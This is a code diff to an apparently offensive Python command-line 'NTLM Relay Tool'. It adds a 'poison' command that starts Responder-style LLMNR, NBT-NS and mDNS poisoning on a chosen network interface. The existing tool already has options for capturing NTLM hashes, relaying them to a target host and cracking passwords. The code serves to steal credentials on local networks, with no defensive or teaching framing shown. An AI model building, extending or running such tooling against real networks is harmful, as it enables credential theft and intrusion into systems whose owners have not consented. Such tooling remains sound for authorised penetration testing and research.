@@ -20,6 +20,7 @@ from src.utils.hash_handler import process_ntlm_hash
 from src.utils.packet_sniffer import start_capture
 from src.modules.exploit.relay import Relay
 from src.utils.mongo_handler import MongoDBHandler
+from src.modules.capture.responder import ResponderCapture
 
 def is_admin():
     try:
@@ -150,11 +151,13 @@ def main():
     logger = setup_logging()
     
     parser = argparse.ArgumentParser(description='NTLM Relay Tool')
-    parser.add_argument('command', choices=['capture', 'stop_capture', 'relay', 'crack', 'list-interfaces', 'list-results'],
+    parser.add_argument('command', choices=['capture', 'stop_capture', 'relay', 'crack', 'list-interfaces', 'list-results', 'poison'],
                        help='Command to execute')
     parser.add_argument('--interface', help='Network interface to capture/relay on')
     parser.add_argument('--port', type=int, default=445, help='Port to listen on (default: 445)')
     parser.add_argument('--target', help='Target host for relay attack')
+    parser.add_argument('--poison-type', choices=['all', 'llmnr', 'nbtns', 'mdns'], default='all',
+                       help='Type of poisoning to perform (default: all)')
     parser.add_argument('--debug', action='store_true', help='Enable debug logging')
     
     args = parser.parse_args()
@@ -249,6 +252,28 @@ def main():
             logger.info("Starting password cracking...")
             # Add password cracking implementation here
             logger.info("Password cracking not implemented yet")
+
+        elif args.command == 'poison':
+            if not args.interface:
+                logger.error("Interface is required for poisoning mode")
+                list_interfaces()
+                return
+                
+            logger.info(f"Starting Responder poisoning on interface {args.interface}...")
+            responder = ResponderCapture(interface=args.interface)
+            
+            try:
+                responder.start_poisoning()
+                logger.info("Poisoning servers started. Press Ctrl+C to stop.")
+                while True:
+                    import time
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                logger.info("Stopping poisoning servers...")
+                responder.stop_poisoning()
+            except Exception as e:
+                logger.error(f"Failed to start poisoning: {str(e)}")
+                responder.stop_poisoning()
 
     except Exception as e:
         logger.error(f"An error occurred: {e}")
